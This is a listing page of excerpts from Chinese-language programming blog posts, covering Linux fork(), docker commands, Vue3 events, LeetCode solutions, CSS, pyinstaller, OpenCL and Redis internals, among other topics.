			<a href="/posts/3593caf6d37ffc9594be895b3fb3144a/" rel="bookmark">
			Linux--fork创建子进程详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.初识fork函数
二.fork的返回值
三.fork原理
1.fork是如何创建子进程的？
2.为什么fork会有两个返回值？
3.为什么父进程的返回值是子进程的pid，子进程返回值是0？
4.fork之后，父子进程谁先运行？
5.如何理解同一个变量，会有不同的值？
一.初识fork函数 创建子进程的方式：
1.在命令行上创建
2.在代码中使用fork创建
今天讲述的是fork创造子进程。
使用man手册查看fork
验证：fork()创建了子进程
#include&lt;stdio.h&gt; #include&lt;sys/types.h&gt; #include&lt;unistd.h&gt; int main() { printf("我是一父个进程，我的pid是：%d，ppid:%d\n",getpid(),getppid()); fork(); printf("我是一个进程，我的pid是：%d，ppid:%d\n",getpid(),getppid()); sleep(1); return 0; } 观察图片，注意pid与ppid
在写一个循环情况观察：
#include&lt;stdio.h&gt; #include&lt;sys/types.h&gt; #include&lt;unistd.h&gt; int main() { printf("我是一父个进程，我的pid是：%d，ppid:%d\n",getpid(),getppid()); fork(); while(1) { printf("我是一个进程，我的pid是：%d，ppid:%d\n",getpid(),getppid()); sleep(1); } return 0; } 从图中我们可以看出fork()之后的代码执行行了两次，根据pid与ppid，我们可以看出是两个不同进程执行的且可以分出那个是子进程，那个是父进程
结论：只有父进程执行了fork之前的代码，fork之后，父子进程都要执行后续代码
二.fork的返回值 fork函数的返回值：
当创建子进程成功时：
有两个返回值，子进程的返回值是0，父进程的返回值是子进程的pid
当创建子进程失败：
有一个返回值，小于0.
代码验证：
#include&lt;stdio.h&gt; #include&lt;sys/types.h&gt; #include&lt;unistd.h&gt; int main() { printf("我是一父个进程，我的pid是：%d，ppid:%d\n",getpid(),getppid()); pid_t id=fork(); while(1) { printf("我是一个进程，我的pid是：%d，ppid:%d\n, id=%d",getpid(),getppid(),id); sleep(1); } return 0; } 为什么fork函数的返回值要有两个呢？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3593caf6d37ffc9594be895b3fb3144a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/257033ddfe450d3a1fb12f5a21b8543c/" rel="bookmark">
			​云上生信，未来已来 | 转录组标准分析流程重磅上线！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Galaxy生信云致力于打造中国人的云上生物信息基础设施。
大量在线工具免费使用。
无需安装，用完即走。
活跃的用户社区，随时交流使用心得。
现在，有参转录组标准分析流程重磅上线，只需上传数据，轻松点击。本工具执行一套非常流行的转录组定量分析流程，即 Hisat2 + Stringtie 经典组合，其步骤为：
hisat2，将经过质控得到的 Clean data，比对到参考基因组上；
samblaster，去除PCR或光学重复;
samtools，去除不合格的比对序列，将 SAM 文件转换成 BAM 文件；
stringtie，结合 hisat2 得到的比对文件（BAM）和基因组注释文件（GTF），进行定量分析，得到每个样本的表达量文件（FPKM / TPM）；
prepDE.py，将 FPTM / TPM 转化为 Counts 计数的表达量矩阵，用于后续差异基因等分析。
TIPs：
原始数据处理，需要大量计算资源（按需付费），请联系管理员配置（ 微信：ilovebtit ）。
运算时间跟数据量大小有关，提交任务后请耐心等待。
工具地址 UseGalaxy.cn &gt; RNA ANALYSIS TOOLS &gt; Standard Analysis &gt; 有参转录组定量分析
图文教程 上传数据，轻松分析 | 云上转录组标准分析流程使用指南
视频教程 活动规则 2023年12月15日 - 2023年12月31日，为项目公测时间。
公测期间，转发本推文至朋友圈积赞，一个赞可免费分析一个转录组，1000个样本封顶。
征集Galaxy生信云平台使用经验教程，一经采用，稿费从优（长期有效）。
协助推广Galaxy生信云平台的朋友，可获得现金或云平台计算资源的奖励（交个朋友）。
关于简说基因
生信平台Galaxy生信云（UseGalaxy.cn）致力于打造中国人的云上生物信息基础设施。大量在线工具免费使用。无需安装，用完即走。活跃的用户社区，随时交流使用心得。
生信培训简说基因的生信培训班，荣获学员的一致好评。如果你也对生物信息学感兴趣，欢迎来跟简说基因，学真生信。
生信分析我们能够承接所有 NGS 组学数据分析业务，包括但不限于 WGS / WES / RNA-seq 等。基因组组装、注释，以及各种重测序业务都可以与简说基因合作。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56cb23bb207fadf0a8afbc1b8bd10241/" rel="bookmark">
			DockerFile
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常用指令 命令作用FROM基础镜像，一切从这里开始构建MAINTAINER镜像作者，姓名+邮箱RUN镜像构建时运行的命令ADD步骤，添加内容(压缩包的话自动解压)WORKDIR镜像的工作目录(进入后默认的目录)VOLUME挂载的目录(双向绑定数据 docker的指令中的-v)EXPOSE 暴露端口(docker指令中的 -p)
CMD指定容器启动的时候要运行的命令(只有最后一个生效，可被替代)ENTRYPOINT指定容器启动的时候要运行的命令(可以追加命令)ONBUILD当构建一个被继承。会触发ONBUILDCOPY类似ADD，将文件拷贝到镜像中ENV构建的时候设置变量/环境变量 //docker build -f dockerfile文件路径 -t 要生成的镜像名:[tag]. 后面的. 代表的是当前目录 docker build -f mydocker-file -t mydocker:01 . docker指令示例 FROM centos MAINTAINER 作者&lt;邮箱&gt; COPY readme.txt /usr/local/readme.txt ADD jdk-8u251-linux-x64.tar.gz /usr/local/ ADD apache-tomcat-8.5.55.tar.gz /usr/local/ RUN yum -y install vim ENV MYPATH /usr/local WORKDIR $MYPATH ENV JAVA_HOME /usr/local/jdk1.8.0_251 ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar EXPOSE 8080 CMD echo MYPATH CMD "-----end-----" 上面的例子只是演示了一下一些指令的作用。 docker 镜像保存至本地
// docker save -o 保存的文件路径名 镜像id docker save -o /Users/guojunqiang/Documents/project/docker-images.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/56cb23bb207fadf0a8afbc1b8bd10241/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80422351cd32601363d9a3b77912e59c/" rel="bookmark">
			Vue3 兄弟组件传参
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：有啥不懂的直接看我最下面手写笔记，很清楚的
相关：父子组件传参&gt;：vue3 父子组件传参详解_vue3父子组件传参-CSDN博客
1. 下载插件
npm install mitt -S 2. 新建mitt.ts文件 （ts写法）
import mitt, { Emitter } from 'mitt'; // 类型 const emitter: Emitter&lt;MittType&gt; = mitt&lt;MittType&gt;(); // 导出 export default emitter; 关于MittType是什么看最下面我手写的笔记
3. 用时
不管是接收还是传递时都需要先引入
import mittBus from '@/utils/mitt'; （1）接收
mittBus.on('xxx', (val?:any) =&gt; { 函数操作 }); 离开时，记得摧毁，不然会一直监听
// 页面卸载时 onUnmounted(() =&gt; { mittBus.off('xxx'); }); （2）传递
mittBus.emit('xxx', { name:'三两', age:'18forever', }); 下面是我手写的笔记，稍微详细一点
注意里面的mounted是onMounted哈，不想改了，就这样
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06c49874d8a77eaef76335c169d71452/" rel="bookmark">
			pytorch发生核心已转存储错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个通常是因为内存访问溢出引起的，我这里是引文 pytorch 和 cuda 版本不匹配，导致底层内存访问出现了差错，所以出现了这个问题，匹配下版本就好了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a93a321f0543f3b47b5e416fe386851/" rel="bookmark">
			算法 - 无重复字符的最长子串（03）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原理： 定义左右两个指针，保证两个指针对应的子串中没有重复的字符，寻找并记录最长的子串长度。如果窗口满足条件，右指针向右滑动扩大窗口，更新最优值；如果窗口不满足条件，左指针向右缩小窗口。 （这里需要借助数据结构 -- 哈希集合，来判断是否有重复字符）
力扣（LeetCode）官网 - 全球极客挚爱的技术成长平台
题目： 给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。
示例： 输入：nums= [-1,0,3,5,9,12],target=9 输出: 4 提示： 你可以假设 nums 中的所有元素是不重复的。n 将在 [1, 10000]之间。 nums 的每个元素都将在 [-9999, 9999]之间。
思路1：滑动窗口 将左指针向右移动一格，表示我们开始枚举下一个字符作为起始位置，然后我们可以不断地向右移动右指针，但需要保证这两个指针对应的子串中没有重复的字符。在移动结束后，这个子串就对应着以左指针开始的，不包含重复字符的最长子串，我们记录下这个子串的长度。在枚举结束后，我们找到的最长的子串的长度即为答案。
在上面的流程中，我们还需要使用一种数据结构来判断是否有重复的字符，常用的数据结构为哈希集合（即 C++ 中的 std::unordered_set，Java 中的 HashSet，Python 中的 set, JavaScript 中的 Set）。
在左指针向右移动的时候，我们从哈希集合中移除一个字符，在右指针向右移动的时候，我们往哈希集合中添加一个字符。
答案： ① 方法1：暴力求解 逐个生成子字符串，看它是否不含有重复的字符 。
该方法虽然可以实现，但是不够优雅。 【208 ms 47.31 MB】
var lengthOfLongestSubstring = function (s) { // 左右指针 let left = (right = max = 0); let val = (endVal = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a93a321f0543f3b47b5e416fe386851/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0880a997fe74ffcb408b8045d6cd2a5/" rel="bookmark">
			BLIP-2 官方库学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hugging face手册
文章目录 OverviewBlip2ConfigBlip2VisionConfigBlip2QFormerConfigBlip2Modelget_text_featuresget_image_featuresget_qformer_feature Overview 《BLIP-2:Bootstrapping Language Image Pre-training with Frozen Image Encoders and Large Language Models》 中提出了BLIP-2模型。BLIP-2通过在冻结的预训练图像编码器和大型语言模型（LLM）之间训练一个轻量级的12层Transformer编码器，利用它们，在各种视觉语言任务中实现最先进的性能。最值得注意的是，BLIP-2在可训练参数减少54倍的零样本VQAv2上比Flamingo（800亿参数模型）提高了8.7%。
论文摘要如下：
由于大规模模型的端到端训练，视觉和语言预训练的成本变得越来越高。本文提出了 BLIP-2，这是一种通用且高效的预训练策略，可从现成的冻结预训练图像编码器和冻结大型语言模型 引导视觉语言预训练【 bootstraps vision-language pre-training】。 BLIP-2 通过轻量级查询转换器弥补了模态差距，该转换器分两个阶段进行预训练。第一阶段从冻结图像编码器引导视觉语言表示学习【 The first stage bootstraps vision-language representation learning from a frozen image encoder. 】。第二阶段从冻结的语言模型引导视觉到语言的生成学习。尽管可训练参数比现有方法少得多，但 BLIP-2 在各种视觉语言任务上实现了最先进的性能。例如，我们的模型在零样本 VQAv2 上的性能比 Flamingo80B 高出 8.7%，可训练参数减少了 54 倍。我们还展示了该模型的新兴功能，即可以遵循自然语言指令的零样本图像到文本生成功能。
Blip2Config ( vision_config = None, qformer_config = None, text_config = None, num_query_tokens = 32, **kwargs ) vision_config（dict，可选）–用于初始化Blip2VisionConfig的配置选项字典。
qformer_config (dict，可选)-用于初始化Blip2QFormerConfig的配置选项字典。
num_query_tokens (int，可选，默认为32)-通过transformer传递的查询令牌数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0880a997fe74ffcb408b8045d6cd2a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13c614607faa32d7b070bfa22e9c5f1f/" rel="bookmark">
			CSS新手入门笔记整理：CSS常用属性表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字体样式 属性
属性值
说明
font-family
微软雅黑/苹方
字体类型
font-size
数值
字体大小
font-weight
数值/关键字
字体粗细（字重）
font-style
normal（正常(默认值)）italic（斜体）oblique（斜体） 字体风格
color
色值
字体颜色
文本样式 属性
属性值
说明
text-indent
数值/2em
首行缩进
text-align
left(左对齐(默认值))center(居中对齐)right(右对齐)justify(两端对齐) 水平对齐
text-decoration
none（去除所有的划线效果(默认值))underline（下划线）line-through（中划线）overline（顶划线） 文本修饰
text-transform
none（无转换 (默认值))uppercase（转换为大写）lowercase（转换为小写）capitalize（只将每个英文单词首字母转换为大写） 大小写转换
line-height
数值
行高
letter-spacing
数值
字间距
word-spacing
数值
词间距(只针对英文单词)
vertical-align
top（顶部对齐）middle（中部对齐）baseline（基线对齐）bottom（底部对齐） 垂直对齐
边框样式 属性
属性值
说明
border
宽度值 样式 颜色值 边框的整体样式
border-width
数值 边框的宽度
border-style
none（无样式）dashed（虚线）solid（实线） 边框的外观
border-color
颜色名称色值transparent（透明） 边框的颜色
border-radius
数值 边框圆角
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/13c614607faa32d7b070bfa22e9c5f1f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40c44e9f9c3a0a3877f84a0209ebf5ec/" rel="bookmark">
			docker 镜像/容器常用操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、docker 下载镜像
2、删除镜像
3、新建容器并启动(测试)
4、列出所有正在运行的容器
5、删除容器
6、启动和停止容器
7、查看日志
8、查看元数据(详细数据)
9、将容器中的文件拷贝到主机中
10、进入容器
11、容器之间数据同步
官方文档：docker指令
1、docker 下载镜像 // 下载最新版 docker pull mysql 下载指定版本 5.7 docker pull mysql:5.7 2、删除镜像 // 删除指定镜像 docker rmi -f 镜像id // 删除全部镜像 docker rmi -f $(docker images -aq) 3、新建容器并启动 docker pull centos docker run --name 容器名称，用来区分容器 -d 后台方式运行 -p 指定容器的端口。 小写p -p ip:主机端口:容器端口 -p 主机端口:容器端口 (常用) -p 容器端口 -P 随机指定端口。 大写P -v -v 主机目录:容器目录:ro //只读 -v 主机目录:容器目录:rw //可读写 镜像名称 // 例子 // nginx01 是容器名称 // 9988是对外的端口。80是容器的 // nginx 为镜像。 这样就可以通过ip:9988 访问80。实现了转发 docker run -d --name nginx01 -p 9988:80 nginx //例子 // 代表的是将docker容器中home的文件全部都映射至服务器/home/ccc文件下，做到容器删除 数据还在(双向绑定，可以多个映射，继续-v跟就可以了) docker run --name nginx01 -p 9988:80 -v /home/ccc:/home centos // ro 只读 docker run --name nginx01 -p 9988:80 -v /home/ccc:/home:ro centos 4、列出所有正在运行的容器 docker ps //列出全部容器 docker ps -a 5、删除容器 // 单个删除 不能删除正在运行的容器。如果强制删除的话 docker rm -f 容器id docker rm 容器id 批量删除 docker rm -f $(docker ps -aq) 6、启动和停止容器 // 启动 docker start 容器id // 重启 docker restart 容器id // 停止 docker stop 容器id //强制停止 docker kill 容器id 7、查看日志 // 查看全部日志显示10条。实时 docker logs -tf --tail 10 容器id 8、查看元数据(详细数据) docker inspect 容器id 9、将容器中的文件拷贝到主机中 // 容器目录 主机目录 docker cp -r 容器id:/home/test.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/40c44e9f9c3a0a3877f84a0209ebf5ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/056c48f9e3f7e1e61c4fedf2469d9799/" rel="bookmark">
			OBS实时字幕（第三第四种方法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 我的视频地址 https://www.bilibili.com/video/BV1uN411V7uG 基于wispper的obs实时字幕插件，中文支持不太好，需要加载模型 github.com/occ-ai/obs-localvocal 推荐使用这个 下面参考B站 www.bilibili.com/video/BV11u411G7Vt Curses：为OBS、VRChat、Twitch和Discord开发的语音转文本字幕软件 项目地址：github.com/mmpneo/curses 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bc892bb10fda6fd2d158a3dac4759c7/" rel="bookmark">
			【Linq】Get top 5 values with lambda Group By Id, Order By and Then select top 5 of each grouping)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Get top 5 values with lambda query Here is my code rptAnnouncement.DataSource = DbContext.Announcements .Where(n =&gt; n.Expire_Date.Value.Date &gt;= DateTime.Now.Date) .ToList(); I take the announcements data from database with lambda and bind this data to ASP.NET repeater(rptAnnouncement). But this query returns all of the data, I just want to get the top 5 (first 5) records like MS SQL Server’s select top 5 * from database.
Answers You can use OrderBy() to order the elements and then Take() to take the first 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bc892bb10fda6fd2d158a3dac4759c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe15f54a3109e3c0c476b5dd15c1c6ff/" rel="bookmark">
			找到往表里查插入数据的进程——跟踪SQL表，找到 IIS 站点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		4台服务器，做了负载均衡。找不到哪一台服务器上的哪一个站点在往表里疯狂插入数据。于是有了下面的文章。
找不到哪一个进程，在往表里插入数据。
1 . 打开数据库工具 SQL Server Profiler，查到 HostName 比如： APP01，这是IIS的名字。ClientProcessID 是客户机进程 ID 也就是应用程序池 ID。
2 . 查到这是哪一台服务器
3 . 找到服务器 IID 的 工作进程 或者 Worker Processes，会查到哪一个应用程序池 哪一个站点。然后结束掉应用程序池。否则仍然会运行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c8a0e7b0bda22d7b8adc7ea934f2829/" rel="bookmark">
			Chart 10 OpenCL 优化教学
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言10.1 博客10.2 Sample Code10.2.1 算法优化10.2.2 Vectorized load/store10.2.3 image 代替 buffer 10.3 Epsilon Filter10.3.1 初始化实现10.3.2 Data pack optimization10.3.3 Vectorized load/store optimization10.3.4 Further increase workload per work item10.3.5 Use local memory optimization10.3.6 Branch operations optimization10.3.7 Summary 10.4 Sobel filter10.4.1 Algorithm optimization10.4.2 Data pack optimization10.4.3 Vectorized load/store optimization10.4.4 Performance and summary 10.5 总结 前言 这一章提供了一些示例，以演示使用前几章讨论的优化技术。除了一些简单的代码片段演示外，我们还通过使用前几章中讨论的多种实践方法，逐步优化了两个知名的图像处理 filter，即 Epsilon filter 和 Sobel filter。
10.1 博客 一些博客讨论了使用案例的优化，这些资源可以在高通开发者网络上公开获取。以下是开发人员可以参考的其中一些博客：
Table 10-1 Blogs on OpenCL optimizations and other resources
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c8a0e7b0bda22d7b8adc7ea934f2829/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4127d108d1bf65c55d1d9a54423f6d9b/" rel="bookmark">
			使用pyinstaller将python代码打包成exe文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先使用pyinstaller生成spec文件，然后配置spec文件重新打包
pyinstaller -D app.py pyinstaller参数 -F ：打包单个文件
-D ：打包多个文件，在dist中生成很多依赖文件
-c:使用控制台执行，只对windows有效
-n : 生成spec文件的名字和exe名字
-p : 设置导入路径
-key : 用于加密python字节码的密钥
--add-data 可以将一些非二进制文件添加到exe打包
--dispath ：指定打包后程序的存放目录
--workpath ：输出所有临时文件存放目录，默认存放在build目录
# -*- mode: python ; coding: utf-8 -*- block_cipher=None py_files=['game.py'] #所有的python脚本文件 add_files=[ ('resources\\fonts\\MONACO.TTF','resources\\fonts'), ('resources\\images\\game_over.gif','resources\\images') ] a = Analysis( py_files, #此列表存放项目设计所有python脚本文件 pathex=['E:\Desktop\Games-master\Tetris'],#此列表为项目绝对路径 binaries=[], datas=add_files, #此列表存放所有资源文件，每个文件都是一个二元组元素 hiddenimports=[], hookspath=[], hooksconfig={}, runtime_hooks=[], excludes=[], cipher=block_cipher, noarchive=False, ) pyz = PYZ(a.pure) exe = EXE( pyz, a.scripts, [], exclude_binaries=True, name='game', debug=False, bootloader_ignore_signals=False, strip=False, upx=True, console=True, disable_windowed_traceback=False, argv_emulation=False, target_arch=None, codesign_identity=None, entitlements_file=None, ) coll = COLLECT( exe, a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4127d108d1bf65c55d1d9a54423f6d9b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bb3e0ce041cae7fae3175b7e9abfb5a/" rel="bookmark">
			《剑指offer》Java版--6.从头到尾打印链表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		剑指offer原题:输入一个链表的头节点，从尾到头反过来打印出每个节点的值。链表节点定义如下:
public class ListNode {
​ int val;
​ ListNode next;
​ ListNode() {}
​ ListNode(int val) { this.val = val; }
​ ListNode(int val, ListNode next) { this.val = val; this.next = next; }
}
LeetCode原题：https://leetcode.cn/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof/description/
思路一：借用栈 class Solution { public int[] reverseBookList(ListNode head) { LinkedList&lt;Integer&gt; stack = new LinkedList&lt;&gt;(); while(head != null) { stack.addFirst(head.val); head = head.next; } int[] res = new int[stack.size()]; int top = 0; for(int item : stack) { res[top++] = item; } return res; } } 时间复杂度O(n)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8bb3e0ce041cae7fae3175b7e9abfb5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d20ce4e357eb769a24f9a6c4b0516df5/" rel="bookmark">
			RK3568平台（网络篇） 有线网络基本概念及测试手法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.什么是交换机？ 交换机是一种用于电(光)信号转发的网络设备。它可以为接入交换机的任意两个网络节点提供独享的电信号通路。最常见的交换机是以太网交换机。交换机工作于OSI参考模型的第二层，即数据链路层。交换机拥有一条高带宽的背部总线和内部交换矩阵，在同一时刻可进行多个端口对之间的数据传输。交换机的传输模式有全双工，半双工，全双工/半双工自适应。
二.交换机的功能与作用 1.学习MAC地址
交换机了解每一端口相连设备的MAC地址，并将地址同相应的端口映射起来，并存放在交换机缓存中的MAC地址表中。如果接收到新的端口回应，它可以学习新的MAC地址并记录好。
2、转发数据帧
当一个数据帧的目的地址在MAC地址表中有映射时，它被转发到连接目的节点的端口而不是所有端口。消除回路 当交换机包括一个冗余回路时，以交换机通过生成树协议避免回路的产生，同时允许存在后备路径。
3、连接不同网络
交换机除了能够连接同种类型的网络之外，还可以在不同类型的网络之间起到互连作用。如今许多交换机都能够提供支持快速以太网或FDDI等的高速连接端口，用于连接网络中的其它交换机或者为带宽占用量大的关键服务器提供附加带宽。
三.典型网络接口分析 MII接口： MII（Media Independent interface）即介质无关接口，它是IEEE-802.3定义的行业标准，是MAC与PHY之间的接口。MII数据接口包含16个信号和2个管理接口信号，如下图所示：
RMII接口 RMII接口有12个信号线，节省了一半的数据线 ，主要包括四个部分。一是从MAC层到物理层的发送数据接口，二是从MAC层到物理层的接收数据接口，三是物理层与MAC层之间时钟接口，四是MAC层和物理层之间数据管理的MDIO/MDC接口。
四.千兆网络的测试 lspci 对 PCIE 设备进行查看：
ifconfig 命令对网络设备信息进行查看
ping 百度的域名进行网络测试
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83e4d95c94a67e363b84879253ec4eb6/" rel="bookmark">
			题目 从小到大输出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写代码将三个整数数按从大到小输出。 例如：
输入：2 3 1
输出：3 2 1
针对这类问题，我们都可以归类为换位问题。
如果输入的是2 3 1，但是输出的却不是2 3 1，就说明变量发生了换位操作。
针对一般的换位操作，我们可以类比生活中的现象：
现在你有一个杯子装着a另一个装着b，你想要把这两个杯子中的液体进行互换，但是如果直接进行互换是不可行的，因为杯中始终有液体无法空出来存放置换后的液体。所以我们需要再额外添加一个空杯子c杯来存放a，这时候杯子空出来了，b也就可以倒进这个杯中，而此时b杯空出来了，a也就可以倒进b杯实现兑换。
在编程中也是如此实现。
我们只要添加一个变量来存放原有的其中一个变量也就可以实现换位操作。
所以代码如此：
#include &lt;stdio.h&gt; int main() { int a = 2; int b = 3; int c = 1; scanf("%d%d%d",&amp;a, &amp;b,&amp;c); if(a&lt;b) { int tmp = a; a = b; b = tmp; } if(a&lt;c) { int tmp = a; a = c; c = tmp; } if(b&lt;c) { int tmp = b; b = c; c = tmp; } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83e4d95c94a67e363b84879253ec4eb6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79ecee5fb24b38dd2ebc829cde6d0666/" rel="bookmark">
			Redis高级特性解析：持久化、主从复制与哨兵机制全面探讨
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis持久化 RDB快照（snapshot） 在默认情况下， Redis 将内存数据库快照保存在名字为 dump.rdb 的二进制文件中。 你可以对 Redis 进行设置， 让它在“ N 秒内数据集至少有 M 个改动”这一条件被满足时， 自动保存一次 数据集。 比如说， 以下设置会让 Redis 在满足“ 60 秒内有至少有 1000 个键被改动”这一条件时， 自动保存一次 数据集： # save 60 1000 // 关闭RDB只需要将所有的save保存策略注释掉即可 还可以手动执行命令 生成RDB快照 ，进入redis客户端 执行命令 save 或 bgsave 可以生成dump.rdb文件， 每次命令执行都会将所有redis内存快照 到一个新的rdb文件里，并覆盖原有rdb快照文件。 bgsave的写时复制(COW)机制 Redis 借助操作系统提供的写时复制技术（Copy-On-Write, COW），在生成快照的同时，依然可以正常 处理写命令。简单来说，bgsave 子进程是由主线程 fork 生成的，可以共享主线程的所有内存数据。 bgsave 子进程运行后，开始读取主线程的内存数据，并把它们写入 RDB 文件。此时，如果主线程对这些 数据也都是读操作，那么，主线程和 bgsave 子进程相互不影响。但是，如果主线程要修改一块数据，那 么，这块数据就会被复制一份，生成该数据的副本。然后，bgsave 子进程会把这个副本数据写入 RDB 文 件，而在这个过程中，主线程仍然可以直接修改原来的数据。 AOF（append-only file） 快照功能并不是非常耐久（durable）： 如果 Redis 因为某些原因而造成故障停机， 那么服务器将丢失 最近写入、且仍未保存到快照中的那些数据。从 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79ecee5fb24b38dd2ebc829cde6d0666/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/959c0c09d172d07b2e92109a30235468/" rel="bookmark">
			Redis数据结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Redis中常用的数据结构 字符串String列表List哈希Hash集合Set有序集合Sort Set 数据结构底层实现 压缩列表 压缩列表实际上类似于一个数组，数组中的每一个元素都对应保存一个数据。
压缩列表中会保存4个特殊字段：
zlbytes字段，位于压缩列表的表头，表示列表长度zltail字段，位于压缩列表的表头，表示列表尾的偏移量zllen字段，位于压缩列表的表头，表示列表中元素的个数zlend字段，位于压缩列表的表尾，表示列表结束 相比于数组，压缩列表减少了不必要的内存，普通数组每个元素的大小相同，统一按照最大的元素大小来分配内存，而压缩列表则化整为零，压缩掉没有用到的空间来使空间变得紧凑，通过offset来控制元素访问；相比链表来说则是少了随机内存的碎片，压缩列表使用的是一块连续的内存空间
跳表 跳表在链表的基础上，增加了多级索引，通过索引位置的几个跳转，实现数据的快速定位
集合操作的复杂度 单元素操作是基础
范围操作非常耗时
统计操作通常高效
例外情况只有几个
单元素操作：指每一种集合类型对单个数据实现的增删改查操作范围操作：指集合类型中的遍历操作，可以返回集合中的所有数据，这类操作一般的时间复杂度是O(N)统计操作：指集合类型对集合中所有元素个数的记录例外情况：指某些数据结构的特殊记录，比如压缩列表和双向链表都会记录表头和表尾的偏移量，这样在表头或者表尾添加删除元素的时间复杂度也就是O(1)了 Redis中的键和值 为了实现从键到值的快速访问，Redis中使用了一个哈希表来存储所有的键值对。
在Redis的全局哈希表中，在哈希桶里存储的是指向值的指针，而不是具体的值。
哈希冲突 Redis使用链地址法来解决全局哈希表的哈希冲突问题。
随着元素数量越来越多，哈希冲突的可能性也会越来越大，每次都需要遍历哈希桶对应的链表，所以需要Rehash操作。
Rehash操作 Redis会对全局哈希表去做rehash操作，也就是增加现有的哈希桶的数量，让逐渐增多的元素可以在更多的桶里分散保存，减少单个桶里的元素数据，从而减少单个桶中的元素数量
Redis会维护两个全局哈希表（表1和表2），一开始插入数据的时候，只会往表1中进行插入操作，也就是只会给表1分配内存空间，此时表2是没有分配内存空间的，当需要进行rehash操作的时候，会有如下操作：
给表2分配内存空间，一般是表1此时内存空间的2倍把表1的数据拷贝到表2中清空表1，释放表1的内存空间 为了防止在拷贝数据时导致Redis线程阻塞，服务不可用，Redis采用渐进式rehash。
渐进式rehash 对Rehash的第二步的数据拷贝环节进行优化，不是一次性拷贝所有的数据，而是分批次进行拷贝。
渐进式rehash分为两个部分：
